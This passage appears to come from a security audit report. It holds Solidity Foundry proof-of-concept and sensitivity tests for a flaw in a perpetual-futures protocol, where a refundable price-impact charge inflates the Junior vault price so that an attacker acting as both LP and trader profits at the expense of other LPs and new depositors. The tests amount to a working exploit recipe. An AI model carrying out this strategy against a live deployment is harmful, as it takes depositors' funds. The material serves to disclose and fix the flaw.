        uint256 poolPaidAtClose = poolBeforeClose - pool.totalAssets();
        uint256 closeFee = (size / 1e12) * 4 / 10_000;
        uint256 traderAfter = clearinghouse.balanceAssets(ATTACKER_TRADER);

        console2.log("pool depth at open                 ", depthAtOpen);
        console2.log("pool depth at close                ", depthAtClose);
        console2.log("VPI paid at open                   ", uint256(vpiAccrued));
        console2.log("VPI rebated at close (cash + fee)  ", poolPaidAtClose + closeFee);
        console2.log("attacker LP gain vs deposit        ", exitAssets - ATTACKER_JUNIOR_ASSETS);
        console2.log("trader round-trip cost             ", traderBefore - traderAfter);
        console2.log("victim Junior value before         ", victimBefore);
        console2.log("victim Junior value after          ", _juniorValue(VICTIM_LP));
        console2.log("third-party deposit value after    ", _juniorValue(thirdParty));

        assertGe(depthAtClose, depthAtOpen, "exit did not reduce pool depth");
        // When the clamp binds the rebate equals the amount paid to within carry dust (< 0.01 USDG, test 1).
        assertGt(uint256(vpiAccrued) - (poolPaidAtClose + closeFee), 100_000, "lifetime clamp does not bind");
        assertGt(exitAssets + traderAfter, ATTACKER_JUNIOR_ASSETS + traderBefore, "attacker still net positive");
        // Here the depositor who bought in at the inflated price carries the loss; the old LP keeps its VPI share.
        assertLt(_juniorValue(thirdParty), ATTACKER_JUNIOR_ASSETS, "the depositor that replaced the exit pays for it");
        console2.log("THIRD-PARTY DEPOSITOR LOSS         ", ATTACKER_JUNIOR_ASSETS - _juniorValue(thirdParty));
        console2.log("ATTACKER NET PROFIT (LP + trader)  ", exitAssets + traderAfter - ATTACKER_JUNIOR_ASSETS - traderBefore);
    }

    /// @notice Mirror image without any attacker LP: a new depositor whose deposit activates while a refundable VPI
    ///         charge sits in the pool pays the inflated price and immediately funds part of the trader's rebate.
    function test_PoC_NewDepositorInheritsTraderRebateObligation() public {
        address newLp = address(0xD3905);
        uint256 depositAssets = 200_000e6;
        settlementToken.mint(newLp, depositAssets);
        vm.startPrank(newLp);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 requestId = juniorVault.requestDeposit(depositAssets, newLp, newLp);
        vm.stopPrank();
        uint256 boundary = pool.lpEpochStart(requestId);
        uint256 size = ((pool.totalAssets() * 39 / 100) / 100e6) * 100e18;

        _warp(boundary - 20);
        uint256 priceBefore = _juniorPrice1e18();
        _commitAndExecute(CfdTypes.Side.LONG, size, 4000e6, false);

        _warp(boundary);
        router.settleLpEpoch(_mockPythUpdateData(PRICE));
        vm.prank(newLp);
        juniorVault.claimDeposit(requestId, depositAssets, newLp, newLp);
        uint256 priceAtEntry = _juniorPrice1e18();
        uint256 valueAtEntry = _juniorValue(newLp);

        _commitAndExecute(CfdTypes.Side.LONG, size, 0, true);
        uint256 valueAfterRebate = _juniorValue(newLp);

        console2.log("Junior price before open (1e18)", priceBefore);
        console2.log("Junior price at entry    (1e18)", priceAtEntry);
        console2.log("new LP deposit                 ", depositAssets);
        console2.log("new LP value at entry          ", valueAtEntry);
        console2.log("new LP value after rebate      ", valueAfterRebate);
        assertGt(priceAtEntry, priceBefore, "deposit priced with the refundable VPI inside NAV");
        assertLt(valueAfterRebate, depositAssets, "new LP is below its deposit once the rebate is paid");
        console2.log("NEW LP LOSS                    ", depositAssets - valueAfterRebate);
    }

    function _log(
        string memory label,
        Outcome memory o
    ) internal pure {
        console2.log(label);
        console2.log("  attacker LP value      ", o.attackerLpValue);
        console2.log("  attacker trader balance", o.attackerTraderBalance);
        console2.log("  victim Junior value    ", o.victimValue);
        console2.log("  senior principal       ", o.seniorPrincipal);
        console2.log("  treasury balance       ", o.treasuryBalance);
    }

}
```

### Test file 2: `packages/perps/test/perps/audit/M3VpiNavExit_Sensitivity.t.sol`

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Sensitivity runs for the refundable-VPI finding: where the extraction stops paying. Attacker share sweep,
///         Senior-heavy pool, nonzero Pyth confidence, and a third-party skew reducer between LP exit and close.
///         Same fixture and production entrypoints as `M3VpiNavExit.t.sol`; each test compares one cycle with the
///         same cycle without the trade.
contract M3VpiNavExitSensitivity is BasePerpTest {

    /// @dev One address is both the Junior LP and the trader, as in `M3VpiNavExit.t.sol`.
    address internal constant ATTACKER_LP = address(0xA77AC1);
    address internal constant ATTACKER_TRADER = ATTACKER_LP;
    address internal constant VICTIM_LP = address(0x71C71);
    address internal constant SENIOR_LP = address(0x5E5105);
    address internal constant THIRD_TRADER = address(0x3D3D3D);
    uint256 internal constant PRICE = 1e8;

    uint256 internal clientNonce;
    uint256 internal confBps; // per-component Pyth confidence, bps of price
    uint256 internal lastRedeemId;

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _init(
        uint256 senior,
        uint256 attackerJunior,
        uint256 victimJunior
    ) internal {
        _setSeniorCapacity(40_000_000e6, 8000);
        _fundJunior(ATTACKER_LP, attackerJunior);
        _fundJunior(VICTIM_LP, victimJunior);
        _fundSenior(SENIOR_LP, senior);
        _fundTrader(ATTACKER_TRADER, 10_000e6);
        _fundTrader(THIRD_TRADER, 10_000e6);
        _warp(pool.lpEpochStart(pool.currentLpEpoch() + 3) + 600);
    }

    function _warp(
        uint256 timestamp
    ) internal {
        vm.warp(timestamp);
        vm.roll(vm.getBlockNumber() + 1);
    }

    function _update(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            SafeCast.toUint64(price * confBps / 10_000),
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory r) {
        r.clientOrderId = keccak256(abi.encode("M3S", ++clientNonce));
        r.side = side;
        r.sizeDelta = size;
        r.marginDelta = margin;
        r.targetPrice = (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1;
        r.isClose = isClose;
        r.bounds.submitBy = uint64(vm.getBlockTimestamp() + router.maxExecutionWindowSeconds());
        r.bounds.executionWindowSeconds = uint32(router.maxExecutionWindowSeconds());
        r.bounds.allowedExecutionModes = 7;
        r.bounds.expectedConfigHash = router.lifecycleBook().currentExecutionConfigHash();
        r.bounds.maxExecutionBountyAssets = type(uint256).max;
        r.bounds.maxExecutionNotionalAssets = type(uint256).max;
        r.bounds.maxGrossAccountDebitAssets = type(uint256).max;
        r.bounds.maxActionChargeAssets = type(uint256).max;
        r.bounds.maxExplicitFeesAssets = type(uint256).max;
        r.bounds.maxPostPositionSize = type(uint256).max;
        r.bounds.maxPostLeverageBps = type(uint32).max;
    }

    function _trade(
        address trader,
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory r = _request(side, size, margin, isClose);
        vm.prank(trader);
        uint64 orderId = router.commitOrder(r);
        bytes[] memory update = _update(PRICE);
        vm.prank(trader);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, update);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order executed");
    }

    function _juniorValue(
        address lp
    ) internal view returns (uint256) {
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        return juniorPrincipal * juniorVault.balanceOf(lp) / juniorVault.totalSupply();
    }

    function _attackerTotal() internal view returns (uint256) {
        // Includes still-escrowed (unfunded) redeem shares at the current Junior price.
        (, uint256 juniorPrincipal,,) = pool.getPendingTrancheState();
        uint256 escrowShares = lastRedeemId == 0 ? 0 : juniorVault.pendingRedeemRequest(lastRedeemId, ATTACKER_LP);
        return settlementToken.balanceOf(ATTACKER_LP) + _juniorValue(ATTACKER_LP)
            + juniorPrincipal * escrowShares / juniorVault.totalSupply() + clearinghouse.balanceAssets(ATTACKER_TRADER);
    }

    /// @return attacker attacker LP+trader total; victim victim Junior value; exitAssets funded exit assets
    function _oneCycle(
        bool trade,
        bool lpExit,
        bool thirdPartyReducer
    ) internal returns (uint256 attacker, uint256 victim, uint256 exitAssets) {
        uint256 shares = juniorVault.balanceOf(ATTACKER_LP);
        uint256 requestId;
        if (lpExit) {
            vm.prank(ATTACKER_LP);
            requestId = juniorVault.requestRedeem(shares, ATTACKER_LP, ATTACKER_LP);
            lastRedeemId = requestId;
        }
        uint256 boundary = pool.lpEpochStart(pool.currentLpEpoch() + 1);
        uint256 size = ((pool.totalAssets() * 39 / 100) / 100e6) * 100e18;

        _warp(boundary - 20);
        if (trade) {
            _trade(ATTACKER_TRADER, CfdTypes.Side.LONG, size, 4000e6, false);
            (,,,,,, int256 vpiAccrued) = engine.positions(ATTACKER_TRADER);
            (,, uint256 entryPrice,,,,) = engine.positions(ATTACKER_TRADER);
            console2.log("  open VPI charged          ", uint256(vpiAccrued));
            console2.log("  open entry price (1e8)    ", entryPrice);
        }
        _warp(boundary);
        if (lpExit) {
            router.settleLpEpoch(_update(PRICE));
            uint256 claimable = juniorVault.claimableRedeemRequest(requestId, ATTACKER_LP);
            console2.log("  shares requested / funded ", shares, claimable);
            if (claimable > 0) {
                vm.prank(ATTACKER_LP);
                exitAssets = juniorVault.claimRedeem(requestId, claimable, ATTACKER_LP, ATTACKER_LP);
            }
        }
        if (thirdPartyReducer) {
            // Honest trader opens the opposite side (skew-reducing) before the attacker's close executes.
            _trade(THIRD_TRADER, CfdTypes.Side.SHORT, size / 2 / 100e18 * 100e18, 4000e6, false);
        }
        if (trade) {
            int256 before = int256(clearinghouse.balanceAssets(ATTACKER_TRADER));
            _trade(ATTACKER_TRADER, CfdTypes.Side.LONG, size, 0, true);
            console2.log("  attacker close cash delta ");
            console2.logInt(int256(clearinghouse.balanceAssets(ATTACKER_TRADER)) - before);
        }
        attacker = _attackerTotal();
        victim = _juniorValue(VICTIM_LP);
        (uint256 sp, uint256 jp,,) = pool.getPendingTrancheState();
        console2.log("  senior principal          ", sp);
        console2.log("  junior principal          ", jp);
        console2.log("  attacker LP wallet        ", settlementToken.balanceOf(ATTACKER_LP));
        console2.log("  attacker LP shares value  ", _juniorValue(ATTACKER_LP));
        console2.log("  attacker escrowed shares  ", lastRedeemId == 0 ? 0 : juniorVault.pendingRedeemRequest(lastRedeemId, ATTACKER_LP));
        console2.log("  attacker trader balance   ", clearinghouse.balanceAssets(ATTACKER_TRADER));
        console2.log("  treasury balance          ", clearinghouse.balanceAssets(engine.protocolTreasury()));
        console2.log("  pool totalAssets          ", pool.totalAssets());
    }

    function _compare(
        string memory label,
        bool thirdParty
    ) internal {
        uint256 snap = vm.snapshotState();
        (uint256 aCtl, uint256 vCtl,) = _oneCycle(false, true, thirdParty);
        vm.revertToState(snap);
        (uint256 aAtk, uint256 vAtk, uint256 exitAssets) = _oneCycle(true, true, thirdParty);
        console2.log(label);
        console2.log("  attacker exit assets      ", exitAssets);
        if (aAtk >= aCtl) console2.log("  attacker PROFIT vs ctl A  ", aAtk - aCtl);
        else console2.log("  attacker LOSS vs ctl A    ", aCtl - aAtk);
        if (vCtl >= vAtk) console2.log("  victim LOSS vs ctl A      ", vCtl - vAtk);
        else console2.log("  victim GAIN vs ctl A      ", vAtk - vCtl);
    }

    // f ~ 0.40 of Junior (attacker 200k, victim 300k), Senior 50%
    function test_Sensitivity_Share40() public {
        _init(500_000e6, 200_000e6, 300_000e6);
        _compare("f~0.40, senior 50%", false);
    }

    // f ~ 0.45
    function test_Sensitivity_Share45() public {
        _init(500_000e6, 225_000e6, 275_000e6);
        _compare("f~0.45, senior 50%", false);
    }

    // Senior-heavy pool: Senior 70%, Junior 30% (attacker 60% of Junior). Exit would push Senior share > 80%.
    function test_Sensitivity_SeniorHeavy() public {
        _init(700_000e6, 180_000e6, 120_000e6);
        _compare("senior 70%, f~0.6", false);
    }

    // Base composition (Senior 500k, attacker 300k, victim 200k) with 5 bps per-component Pyth confidence (fixture adverse multiplier 2000 => ~1 bp shift).
    function test_Sensitivity_Conf5bps() public {
        confBps = 5;
        _init(500_000e6, 300_000e6, 200_000e6);
        _compare("base pool, conf 5 bps", false);
    }

    // Base composition (Senior 500k, attacker 300k, victim 200k) with 10 bps (release max ratio) confidence.
    function test_Sensitivity_Conf10bps() public {
        confBps = 10;
        _init(500_000e6, 300_000e6, 200_000e6);
        _compare("base pool, conf 10 bps", false);
    }

    // Base composition (Senior 500k, attacker 300k, victim 200k); an honest trader reduces skew by half after the LP exit and before the attacker's close.
    function test_Sensitivity_ThirdPartyReducer() public {
        _init(500_000e6, 300_000e6, 200_000e6);
        _compare("base pool, third-party short of size/2 before close", true);
    }

}
```
